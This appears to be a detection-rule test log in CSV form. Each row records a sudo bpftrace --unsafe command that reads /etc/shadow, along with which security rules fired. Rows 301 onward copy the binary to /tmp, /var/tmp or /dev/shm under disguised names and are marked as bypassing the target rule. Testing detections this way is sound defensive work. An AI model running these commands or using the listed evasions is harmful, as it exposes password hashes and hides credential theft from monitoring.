ID,Command,Log File,Result,All Detected Rules
253,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0x7f.00.00.01'",BPFtrace_Unsafe_Option_Usage_attack253.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
254,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=2130706433UL'",BPFtrace_Unsafe_Option_Usage_attack254.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
255,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=+2130706433'",BPFtrace_Unsafe_Option_Usage_attack255.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
256,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0002130706433'",BPFtrace_Unsafe_Option_Usage_attack256.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
257,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=127.0.0.00000001'",BPFtrace_Unsafe_Option_Usage_attack257.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
258,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0x7f000001U'",BPFtrace_Unsafe_Option_Usage_attack258.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
259,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0x007f000001'",BPFtrace_Unsafe_Option_Usage_attack259.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
260,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=127.000000000.000000.1'",BPFtrace_Unsafe_Option_Usage_attack260.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
261,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=127.0.0.1L'",BPFtrace_Unsafe_Option_Usage_attack261.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
262,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=127.0.0.0b00000001'",BPFtrace_Unsafe_Option_Usage_attack262.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
263,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=127.0.0.0x01'",BPFtrace_Unsafe_Option_Usage_attack263.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
264,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0x00007f000001'",BPFtrace_Unsafe_Option_Usage_attack264.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
265,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0x7F.0.0.1'",BPFtrace_Unsafe_Option_Usage_attack265.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
266,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0x7F000001'",BPFtrace_Unsafe_Option_Usage_attack266.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
267,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0x00007F000001'",BPFtrace_Unsafe_Option_Usage_attack267.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
268,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=+0x7f000001'",BPFtrace_Unsafe_Option_Usage_attack268.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
269,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=002130706433'",BPFtrace_Unsafe_Option_Usage_attack269.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
270,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=000000127.0.0.1'",BPFtrace_Unsafe_Option_Usage_attack270.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
271,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0x7f000001LL'",BPFtrace_Unsafe_Option_Usage_attack271.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
272,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=2130706433L'",BPFtrace_Unsafe_Option_Usage_attack272.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
273,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=127.0.0.01'",BPFtrace_Unsafe_Option_Usage_attack273.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
274,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=127.000.0.1'",BPFtrace_Unsafe_Option_Usage_attack274.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
275,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0177.0000.0001'",BPFtrace_Unsafe_Option_Usage_attack275.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
276,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0x7f.000000.0.1'",BPFtrace_Unsafe_Option_Usage_attack276.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
277,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0x7f.0.00.001'",BPFtrace_Unsafe_Option_Usage_attack277.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
278,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=2130706433U'",BPFtrace_Unsafe_Option_Usage_attack278.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
279,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=02130706433'",BPFtrace_Unsafe_Option_Usage_attack279.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
280,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0x0000007f000001'",BPFtrace_Unsafe_Option_Usage_attack280.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
281,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=127.0.0000001'",BPFtrace_Unsafe_Option_Usage_attack281.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
282,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=127.00.00.01'",BPFtrace_Unsafe_Option_Usage_attack282.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
283,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0x7f000001UL'",BPFtrace_Unsafe_Option_Usage_attack283.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
284,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=+0x00007f000001'",BPFtrace_Unsafe_Option_Usage_attack284.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
285,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0000002130706433'",BPFtrace_Unsafe_Option_Usage_attack285.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
286,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=127.0.1'",BPFtrace_Unsafe_Option_Usage_attack286.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
287,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=127.1'",BPFtrace_Unsafe_Option_Usage_attack287.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
288,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0177.0.1'",BPFtrace_Unsafe_Option_Usage_attack288.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
289,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0x7f.1'",BPFtrace_Unsafe_Option_Usage_attack289.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
290,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0x7f000001i'",BPFtrace_Unsafe_Option_Usage_attack290.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
291,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=2130706433i'",BPFtrace_Unsafe_Option_Usage_attack291.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
292,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=127.0000001'",BPFtrace_Unsafe_Option_Usage_attack292.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
293,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0x7f.0.0.01'",BPFtrace_Unsafe_Option_Usage_attack293.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
294,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0177.00.00.01'",BPFtrace_Unsafe_Option_Usage_attack294.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
295,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0x00007F000001UL'",BPFtrace_Unsafe_Option_Usage_attack295.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
296,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=127.0.0.0001'",BPFtrace_Unsafe_Option_Usage_attack296.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
297,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=2130706433LL'",BPFtrace_Unsafe_Option_Usage_attack297.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
298,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0x7F000001LL'",BPFtrace_Unsafe_Option_Usage_attack298.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
299,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0000177000000001'",BPFtrace_Unsafe_Option_Usage_attack299.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
300,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=127.000.1'",BPFtrace_Unsafe_Option_Usage_attack300.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
301,"sudo cp /usr/bin/bpftrace /tmp/t && sudo /tmp/t --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack301.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
302,"sudo cp /usr/bin/bpftrace /tmp/bt && sudo /tmp/bt --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack302.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
303,"sudo cp /usr/bin/bpftrace /tmp/xtrace && sudo /tmp/xtrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack303.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
304,"sudo cp /usr/bin/bpftrace /tmp/sysmon && sudo /tmp/sysmon --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack304.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
305,"sudo cp /usr/bin/bpftrace /tmp/trace && sudo /tmp/trace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack305.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
306,"sudo cp /usr/bin/bpftrace /tmp/pt && sudo /tmp/pt --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack306.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
307,"sudo cp /usr/bin/bpftrace /tmp/run && sudo /tmp/run --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack307.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
308,"sudo cp /usr/bin/bpftrace /tmp/diag && sudo /tmp/diag --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack308.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
309,"sudo cp /usr/bin/bpftrace /tmp/agent && sudo /tmp/agent --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack309.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
310,"sudo cp /usr/bin/bpftrace /tmp/helper && sudo /tmp/helper --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack310.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
311,"sudo cp /usr/bin/bpftrace /var/tmp/t1 && sudo /var/tmp/t1 --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack311.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
312,"sudo cp /usr/bin/bpftrace /var/tmp/exec && sudo /var/tmp/exec --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack312.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
313,"sudo cp /usr/bin/bpftrace /dev/shm/b && sudo /dev/shm/b --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack313.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
314,"sudo cp /usr/bin/bpftrace /dev/shm/trace && sudo /dev/shm/trace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack314.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
315,"sudo cp /usr/bin/bpftrace /dev/shm/x && sudo /dev/shm/x --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack315.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
316,"sudo cp /usr/bin/bpftrace /tmp/.sys && sudo /tmp/.sys --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack316.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
317,"sudo cp /usr/bin/bpftrace /tmp/.cache && sudo /tmp/.cache --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack317.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
318,"sudo cp /usr/bin/bpftrace /tmp/.bin && sudo /tmp/.bin --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack318.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
319,"sudo cp /usr/bin/bpftrace /tmp/logd && sudo /tmp/logd --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack319.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
320,"sudo cp /usr/bin/bpftrace /tmp/udevd && sudo /tmp/udevd --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack320.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
321,"sudo cp /usr/bin/bpftrace /tmp/kworker && sudo /tmp/kworker --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack321.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
322,"sudo cp /usr/bin/bpftrace /tmp/dbus && sudo /tmp/dbus --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack322.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
323,"sudo cp /usr/bin/bpftrace /tmp/audit && sudo /tmp/audit --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack323.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
324,"sudo cp /usr/bin/bpftrace /tmp/monitor && sudo /tmp/monitor --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack324.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
325,"sudo cp /usr/bin/bpftrace /tmp/collector && sudo /tmp/collector --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack325.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
326,"sudo cp /usr/bin/bpftrace /tmp/runner && sudo /tmp/runner --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack326.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
327,"sudo cp /usr/bin/bpftrace /tmp/execd && sudo /tmp/execd --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack327.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
328,"sudo cp /usr/bin/bpftrace /tmp/trace64 && sudo /tmp/trace64 --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack328.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
329,"sudo cp /usr/bin/bpftrace /tmp/sysd && sudo /tmp/sysd --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack329.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
330,"sudo cp /usr/bin/bpftrace /tmp/agentd && sudo /tmp/agentd --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack330.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
331,"sudo cp /usr/bin/bpftrace /tmp/bpf && sudo /tmp/bpf --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack331.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
332,"sudo cp /usr/bin/bpftrace /tmp/tracee && sudo /tmp/tracee --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack332.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
333,"sudo cp /usr/bin/bpftrace /tmp/probe && sudo /tmp/probe --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack333.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
334,"sudo cp /usr/bin/bpftrace /tmp/cmd && sudo /tmp/cmd --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack334.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
335,"sudo cp /usr/bin/bpftrace /tmp/runme && sudo /tmp/runme --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack335.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
336,"sudo cp /usr/bin/bpftrace /tmp/task && sudo /tmp/task --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack336.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
337,"sudo cp /usr/bin/bpftrace /tmp/job && sudo /tmp/job --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack337.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
338,"sudo cp /usr/bin/bpftrace /tmp/execme && sudo /tmp/execme --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack338.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
339,"sudo cp /usr/bin/bpftrace /tmp/hook && sudo /tmp/hook --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack339.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
340,"sudo cp /usr/bin/bpftrace /tmp/driver && sudo /tmp/driver --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack340.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
341,"sudo install -m 0755 /usr/bin/bpftrace /tmp/alt && sudo /tmp/alt --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack341.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
342,"sudo install -m 0755 /usr/bin/bpftrace /tmp/alt2 && sudo /tmp/alt2 --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack342.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
